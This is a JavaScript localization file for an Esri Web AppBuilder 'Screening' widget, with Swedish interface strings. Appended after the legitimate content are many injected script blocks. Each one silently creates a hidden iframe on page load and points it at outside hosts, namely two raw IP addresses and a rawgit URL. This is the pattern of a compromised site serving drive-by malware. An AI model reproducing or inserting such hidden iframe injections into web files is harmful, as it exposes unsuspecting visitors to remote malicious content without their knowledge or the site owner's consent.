// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/nls/strings":{_widgetLabel:"Unders\u00f6kning",geometryServicesNotFound:"Geometritj\u00e4nsten \u00e4r inte tillg\u00e4nglig.",unableToDrawBuffer:"Det gick inte att rita bufferten. F\u00f6rs\u00f6k igen.",invalidConfiguration:"Ogiltig konfiguration.",clearAOIButtonLabel:"B\u00f6rja om",noGraphicsShapefile:"Den \u00f6verf\u00f6rda shapefilen inneh\u00e5ller ingen grafik.",zoomToLocationTooltipText:"Zooma till plats",noGraphicsToZoomMessage:"Ingen grafik hittades att zooma in till.",
placenameWidget:{placenameLabel:"S\u00f6k efter en plats"},drawToolWidget:{useDrawToolForAOILabel:"V\u00e4lj ritl\u00e4ge",toggleSelectability:"Klicka om du vill v\u00e4xla valbarhet",chooseLayerTitle:"V\u00e4lj valbart lager",selectAllLayersText:"Markera alla",layerSelectionWarningTooltip:"\u00c5tminstone ett lager b\u00f6r v\u00e4ljas s\u00e5 att det g\u00e5r att skapa AOI"},shapefileWidget:{shapefileLabel:"\u00d6verf\u00f6r en zippad shapefil",uploadShapefileButtonText:"\u00d6verf\u00f6r",unableToUploadShapefileMessage:"Det g\u00e5r inte att \u00f6verf\u00f6ra shapefilen."},
coordinatesWidget:{selectStartPointFromSearchText:"Ange en startpunkt",addButtonTitle:"L\u00e4gg till",deleteButtonTitle:"Ta bort",mapTooltipForStartPoint:"Klicka i kartan f\u00f6r att ange en startpunkt",mapTooltipForUpdateStartPoint:"Klicka i kartan f\u00f6r att uppdatera startpunkten",locateText:"Leta upp",locateByMapClickText:"V\u00e4lj startkoordinater",enterBearingAndDistanceLabel:"Ange b\u00e4ring och avst\u00e5nd fr\u00e5n startpunkten",bearingTitle:"B\u00e4ring",distanceTitle:"Avst\u00e5nd",
planSettingTooltip:"Planinst\u00e4llningar",invalidLatLongMessage:"Ange giltiga v\u00e4rden."},bufferDistanceAndUnit:{bufferInputTitle:"Buffertavst\u00e5nd (valfritt)",bufferInputLabel:"Visa resultat inom"},traverseSettings:{bearingLabel:"B\u00e4ring",lengthLabel:"L\u00e4ngd",addButtonTitle:"L\u00e4gg till",deleteButtonTitle:"Ta bort"},planSettings:{expandGridTooltipText:"Expandera rutn\u00e4t",collapseGridTooltipText:"Komprimera rutn\u00e4t",directionUnitLabelText:"Riktningsenheter",distanceUnitLabelText:"Avst\u00e5nd och l\u00e4ngdenheter",
planSettingsComingSoonText:"Kommer snart"},newTraverse:{invalidBearingMessage:"Ogiltig b\u00e4ring.",invalidLengthMessage:"Ogiltig l\u00e4ngd.",negativeLengthMessage:"Negativ l\u00e4ngd"},reportsTab:{aoiAreaText:"AOI-omr\u00e5de",downloadButtonTooltip:"H\u00e4mta",printButtonTooltip:"Skriv ut",uploadShapefileForAnalysisText:"\u00d6verf\u00f6r shapefil som ska inkluderas i analys",uploadShapefileForButtonText:"Bl\u00e4ddra",downloadLabelText:"V\u00e4lj format:",downloadBtnText:"H\u00e4mta",noDetailsAvailableText:"Det gick inte att hitta n\u00e5got resultat",
featureCountText:"Antal",featureAreaText:"Omr\u00e5de",featureLengthText:"L\u00e4ngd",attributeChooserTooltip:"V\u00e4lj attribut som ska visas",csv:"CSV",filegdb:"Filbaserad geodatabas",shapefile:"Shapefil",noFeaturesFound:"Inga resultat hittades f\u00f6r det valda filformatet",selectReportFieldTitle:"V\u00e4lj f\u00e4lt",noFieldsSelected:"Inga f\u00e4lt \u00e4r markerade",intersectingFeatureExceedsMsgOnCompletion:"Det maximala antalet poster har n\u00e5tts f\u00f6r ett eller flera lager.",unableToAnalyzeText:"Det g\u00e5r inte att utf\u00f6ra en analys n\u00e4r det maximala antalet poster har n\u00e5tts.",
errorInPrintingReport:"Det g\u00e5r inte att skriva ut rapporten. Kontrollera om inst\u00e4llningarna \u00e4r de r\u00e4tta.",aoiInformationTitle:"Information om intressant omr\u00e5de (AOI, area of interest)",summaryReportTitle:"Sammanfattning",notApplicableText:"Inget standardv\u00e4rde",downloadReportConfirmTitle:"Bekr\u00e4fta h\u00e4mtning",downloadReportConfirmMessage:"Vill du utf\u00f6ra h\u00e4mtningen?",noDataText:"Inga data",createReplicaFailedMessage:"H\u00e4mtningen av f\u00f6ljande lager misslyckades: \x3cbr/\x3e ${layerNames}",
extractDataTaskFailedMessage:"H\u00e4mtningen misslyckades.",printLayoutLabelText:"Layout",printBtnText:"Skriv ut",printDialogHint:"Obs! Den nya rapporttiteln och kommentarerna kan inte redigeras i f\u00f6nstret f\u00f6r f\u00f6rhandsgranskning av rapporten.",unableToDownloadFileGDBText:"Filgeodatabasen kan inte h\u00e4mtas f\u00f6r intresseomr\u00e5den som inneh\u00e5ller punkt- eller linjeplatser",unableToDownloadShapefileText:"Shapefilen kan inte h\u00e4mtas f\u00f6r intresseomr\u00e5den som inneh\u00e5ller punkt- eller linjeplatser",
analysisUnitLabelText:"Visa resultat i:",analysisUnitButtonTooltip:"V\u00e4lj enheter f\u00f6r analys",analysisCloseBtnText:"St\u00e4ng",feetUnit:"Fot/kvadratfot",milesUnit:"Miles/acres",metersUnit:"Meter/kvadratmeter",kilometersUnit:"Kilometer/kvadratkilometer",hectaresUnit:"Kilometer/hektar",hectaresAbbr:"hektar",layerNotVisibleText:"Det g\u00e5r inte att analysera, lagret \u00e4r avst\u00e4ngt eller utanf\u00f6r skalans synlighetsintervall.",refreshBtnTooltip:"Uppdatera rapport"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});